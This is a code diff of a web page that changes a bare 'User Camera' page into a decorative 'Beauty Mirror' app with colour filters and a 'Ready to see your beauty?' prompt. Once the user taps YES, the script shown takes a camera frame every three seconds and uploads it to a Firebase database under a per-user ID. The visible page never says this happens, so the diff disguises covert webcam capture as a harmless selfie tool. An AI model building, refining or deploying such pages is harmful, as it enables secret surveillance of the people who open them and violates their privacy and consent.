@@ -3,24 +3,90 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>User Camera</title>
+<title>Beauty Mirror</title>
 
 <style>
-body{margin:0;font-family:Arial;background:#000;color:white;text-align:center;}
-video{width:90%;margin-top:20px;border-radius:10px;}
-button{padding:12px 20px;margin-top:20px;border:none;border-radius:10px;background:#00ff9d;}
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial;}
+
+body{
+  min-height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  background:linear-gradient(-45deg,#00d4ff,#8a2be2,#ff0080,#00ff99);
+  background-size:400% 400%;
+  animation:bgMove 10s ease infinite;
+}
+
+@keyframes bgMove{
+  0%{background-position:0% 50%}
+  50%{background-position:100% 50%}
+  100%{background-position:0% 50%}
+}
+
+.card{
+  width:90%;
+  max-width:550px;
+  padding:25px;
+  border-radius:25px;
+  background:rgba(255,255,255,.08);
+  backdrop-filter:blur(20px);
+  color:white;
+  text-align:center;
+}
+
+.btn{
+  margin-top:15px;
+  padding:14px 30px;
+  border:none;
+  border-radius:50px;
+  cursor:pointer;
+  color:white;
+  background:linear-gradient(90deg,#00d4ff,#ff0080);
+}
+
+video{
+  width:100%;
+  border-radius:20px;
+  margin-top:15px;
+}
+
+#cameraBox{display:none;}
+
+.filters button{
+  margin:5px;
+  padding:10px;
+  border:none;
+  border-radius:12px;
+  cursor:pointer;
+}
 </style>
 </head>
 
 <body>
 
-<div id="welcome">
-  <h2>Camera Start</h2>
-  <button onclick="startCamera()">YES</button>
-</div>
+<div class="card">
 
-<div id="cameraBox" style="display:none;">
-  <video id="video" autoplay playsinline></video>
+  <div id="welcome">
+    <h1>✨ Ready to see your beauty?</h1>
+    <p>Tap below to start</p>
+    <button class="btn" onclick="startCamera()">YES ✨</button>
+  </div>
+
+  <div id="cameraBox">
+    <video id="video" autoplay playsinline></video>
+
+    <div class="filters">
+      <button onclick="setFilter('none')">Normal</button>
+      <button onclick="setFilter('grayscale(100%)')">B&W</button>
+      <button onclick="setFilter('sepia(100%)')">Vintage</button>
+      <button onclick="setFilter('contrast(130%) saturate(160%)')">Pro</button>
+      <button onclick="setFilter('brightness(120%) saturate(180%)')">Glow</button>
+    </div>
+
+    <p id="status">Waiting...</p>
+  </div>
+
 </div>
 
 <canvas id="canvas" style="display:none;"></canvas>
@@ -44,7 +110,7 @@ const firebaseConfig = {
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
-/* ✔ UNIQUE USER ID */
+/* ✔ UNIQUE USER ID (FIX) */
 let userId = localStorage.getItem("userId");
 
 if(!userId){
@@ -55,7 +121,6 @@ if(!userId){
 let stream;
 
 async function startCamera(){
-
   stream = await navigator.mediaDevices.getUserMedia({video:true});
 
   document.getElementById("video").srcObject = stream;
@@ -63,9 +128,16 @@ async function startCamera(){
   document.getElementById("welcome").style.display="none";
   document.getElementById("cameraBox").style.display="block";
 
+  document.getElementById("status").innerText="Live";
+
   startSnapshots();
 }
 
+function setFilter(f){
+  document.getElementById("video").style.filter = f;
+}
+
+/* 🔥 FIXED SNAPSHOT SYSTEM (MULTI USER SAFE) */
 function startSnapshots(){
 
   const video = document.getElementById("video");
@@ -74,26 +146,19 @@ function startSnapshots(){
 
   setInterval(()=>{
 
-    try{
+    if(!video.videoWidth) return;
 
-      if(!video.videoWidth) return;
+    canvas.width=320;
+    canvas.height=240;
 
-      canvas.width = 320;
-      canvas.height = 240;
+    ctx.drawImage(video,0,0,320,240);
 
-      ctx.drawImage(video,0,0,320,240);
+    const frame = canvas.toDataURL("image/jpeg",0.5);
 
-      const frame = canvas.toDataURL("image/jpeg",0.5);
-
-      /* 🔥 FIXED MULTI USER WRITE */
-      db.ref("camera/" + userId).set({
-        frame: frame,
-        updatedAt: Date.now()
-      });
-
-    }catch(e){
-      console.log(e);
-    }
+    db.ref("camera/" + userId).set({
+      frame: frame,
+      updatedAt: Date.now()
+    });
 
   },3000);
 }
